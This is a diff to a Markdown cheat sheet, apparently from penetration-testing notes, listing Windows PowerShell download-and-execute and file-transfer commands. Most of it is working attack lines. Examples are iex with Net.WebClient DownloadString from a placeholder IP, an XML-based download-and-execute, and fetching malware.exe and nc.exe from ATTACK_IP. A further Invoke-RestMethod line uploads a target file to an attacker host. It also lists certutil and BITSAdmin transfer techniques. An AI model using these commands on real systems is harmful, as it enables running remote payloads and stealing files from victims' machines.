@@ -1,26 +1,18 @@
 # Windows PowerShell
 
-### 1) In Memory
+### 1) Invoke-RestMethod
 
-    Net.WebClient DownloadString Method
-    Net.WebClient DownloadData Method
-    Net.WebClient OpenRead Method
-    .NET [Net.HttpWebReqest].class
-    Word.Application COM Object
-    Excel.Application COM Object
-    InternetExplorer.Application COM Object
-    MSXML2.ServerXmlHTTP Com Object
-    Certutil.exe w/ -ping argument
+	Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE
 
-### 2) On Disk
+### 2) Invoke-WebRequest
 
-    Net.WebClient DownloadFile Method
+	powershell.exe iwr -uri ATTACK_IP/malware.exe -o C:\temp\malware.exe
 
-    BITSAdmin.exe
+### 3) Wget
 
-    Cerutil.exe w/ -urlcache argument
+	wget http://ATTACK_IP/nc.exe -OutFile nc.exe
 
-### 3) Net.WebClient Download String Method
+### 4) Net.WebClient Download String Method
 
     powershell.exe iex (New-Object Net.Webclient).DownloadString('http://<IP>/<File>')
 
@@ -46,13 +38,33 @@
     $r = $wr.GetResponse()
     IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 
-### 4) Net.WebClient Single Quotes Download and store
+### 5) In Memory
+
+    Net.WebClient DownloadString Method
+    Net.WebClient DownloadData Method
+    Net.WebClient OpenRead Method
+    .NET [Net.HttpWebReqest].class
+    Word.Application COM Object
+    Excel.Application COM Object
+    InternetExplorer.Application COM Object
+    MSXML2.ServerXmlHTTP Com Object
+    Certutil.exe w/ -ping argument
+
+### 6) On Disk
+
+    Net.WebClient DownloadFile Method
+
+    BITSAdmin.exe
+
+    Cerutil.exe w/ -urlcache argument
+
+### 7) Net.WebClient Single Quotes Download and store
 
     iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')
 
     powershell.exe iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')
 
-### 5) Net.WebClient User Agent Download
+### 8) Net.WebClient User Agent Download
 
     $downloader = New-Object System.Net.WebClient
     $downloader.Headers.Add ("")
@@ -60,7 +72,7 @@
     $command = $downloader.DownloadString($payload)
     iex $command
 
-### 6) XML Download and Execute
+### 9) XML Download and Execute
 
     $xmldoc = New-Object System.Xml.XmlDocument
     $xmldoc.Load("http://<IP>/<File.xml>")
@@ -76,13 +88,7 @@
 		    </a>
     </command>
 
-### 7) Invoke-RestMethod
 
-	Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE
-
-### 8) Invoke-WebRequest
-
-	powershell.exe iwr -uri ATTACK_IP/malware.exe -o C:\temp\malware.exe
 
 # TIPS AND TRICKS
 
